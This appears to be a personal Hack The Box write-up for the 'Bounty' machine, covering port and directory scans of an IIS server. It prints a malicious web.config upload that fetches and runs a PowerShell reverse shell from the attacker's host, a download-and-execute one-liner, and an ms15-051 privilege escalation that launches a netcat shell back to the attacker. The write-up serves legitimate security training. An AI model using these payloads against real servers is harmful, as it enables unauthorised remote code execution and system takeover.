nmap
```
┌──(kali㉿kali)-[~/HTB/bounty]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.203.181
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 21:21 EST
Nmap scan report for 10.129.203.181
Host is up (0.050s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|phone
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (96%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (96%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 8.1 Update 1 (91%), Microsoft Windows Phone 7.5 or 8.0 (91%), Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2008 R2 (88%), Microsoft Windows Server 2008 R2 or Windows 8.1 (88%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.52 ms 10.10.14.1
2   51.40 ms 10.129.203.181

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.37 seconds
```

```
┌──(kali㉿kali)-[~/HTB/bounty]
└─$ dirsearch -u http://10.129.203.181/     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/bounty/reports/http_10.129.203.181/__25-01-15_21-21-01.txt

Target: http://10.129.203.181/

[21:21:01] Starting: 
[21:21:02] 403 -  312B  - /%2e%2e//google.com                               
[21:21:02] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[21:21:03] 404 -    1KB - /.ashx                                            
[21:21:03] 404 -    1KB - /.asmx                                            
[21:21:22] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[21:21:58] 403 -    1KB - /aspnet_client/                                   
[21:21:58] 301 -  159B  - /aspnet_client  ->  http://10.129.203.181/aspnet_client/
[21:22:07] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[21:23:43] 404 -    1KB - /service.asmx                                     
[21:24:04] 403 -    2KB - /Trace.axd                                        
[21:24:05] 404 -    1KB - /umbraco/webservices/codeEditorSave.asmx          
[21:24:17] 500 -    3KB - /WebResource.axd?d=LER8t9aS                       
                                                                             
Task Completed
```
the above directory bust was not good so i used gobuster for a better one

```
┌──(kali㉿kali)-[~/HTB/bounty]
└─$ gobuster dir -u http://10.129.203.181/ -w /home/kali/offsec/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 30 -x aspx
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.203.181/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /home/kali/offsec/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
/*checkout*.aspx      (Status: 400) [Size: 11]
/*docroot*.aspx       (Status: 400) [Size: 11]
/*.aspx               (Status: 400) [Size: 11]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]
/http%3A.aspx         (Status: 400) [Size: 11]
/UploadedFiles        (Status: 301) [Size: 159] [--> http://10.129.203.181/UploadedFiles/]
/q%26a.aspx           (Status: 400) [Size: 11]
/**http%3a.aspx       (Status: 400) [Size: 11]
/*http%3A.aspx        (Status: 400) [Size: 11]
/uploadedFiles        (Status: 301) [Size: 159] [--> http://10.129.203.181/uploadedFiles/]
/**http%3A.aspx       (Status: 400) [Size: 11]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 11]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 11]
/http%3A%2F%2Fblog.aspx (Status: 400) [Size: 11]
/uploadedfiles        (Status: 301) [Size: 159] [--> http://10.129.203.181/uploadedfiles/]
/**http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]
/s%26p.aspx           (Status: 400) [Size: 11]
/%3FRID%3D2671.aspx   (Status: 400) [Size: 11]
/devinmoore*.aspx     (Status: 400) [Size: 11]
/children%2527s_tent.aspx (Status: 400) [Size: 11]
/Wanted%2e%2e%2e.aspx (Status: 400) [Size: 11]
/How_to%2e%2e%2e.aspx (Status: 400) [Size: 11]
/200109*.aspx         (Status: 400) [Size: 11]
/*dc_.aspx            (Status: 400) [Size: 11]
/*sa_.aspx            (Status: 400) [Size: 11]
/help%2523drupal.aspx (Status: 400) [Size: 11]
/http%3A%2F%2Fcommunity.aspx (Status: 400) [Size: 11]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct.aspx (Status: 400) [Size: 11]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29.aspx (Status: 400) [Size: 11]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt.aspx (Status: 400) [Size: 11]
/http%3A%2F%2Fradar.aspx (Status: 400) [Size: 11]
/q%26a2.aspx          (Status: 400) [Size: 11]
/login%3f.aspx        (Status: 400) [Size: 11]
/Shakira%20Oral%20Fixation%201%20%26%202.aspx (Status: 400) [Size: 11]
/%22julie%20roehm%22.aspx (Status: 500) [Size: 3026]
/%22britney%20spears%22.aspx (Status: 500) [Size: 3026]
/%22james%20kim%22.aspx (Status: 500) [Size: 3026]
/http%3A%2F%2Fjeremiahgrossman.aspx (Status: 400) [Size: 11]
/http%3A%2F%2Fweblog.aspx (Status: 400) [Size: 11]
/http%3A%2F%2Fswik.aspx (Status: 400) [Size: 11]
Progress: 441118 / 441120 (100.00%)
===============================================================
Finished
===============================================================
```

![Pasted image 20250116110535](<0. Attachments/Pasted image 20250116110535.png>)

https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config

uploaded file as web.config to get a reverse shell
```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.4/Invoke-PowerShellTcp.ps1')")
%>
```
![Pasted image 20250116114544](<0. Attachments/Pasted image 20250116114544.png>)

![Pasted image 20250116114910](<0. Attachments/Pasted image 20250116114910.png>)

i had to use dir -force to view the contents of the directory

https://github.com/decoder-it/lonelypotato/blob/master/RottenPotatoEXE/MSFRottenPotato.exe

```
iex(new-object net.webclient).downloadstring('http://10.10.14.4/nc64.exe')
```

https://github.com/euphrat1ca/ms15-051/blob/master/ms15-051/ms15-051/x64/ms15-051.exe

```
.\ms15-051.exe "C:\Users\merlin\Desktop\nc.exe -e cmd 10.10.14.4 1337"
```

after lot of fails this worked
![Pasted image 20250116133641](<0. Attachments/Pasted image 20250116133641.png>)
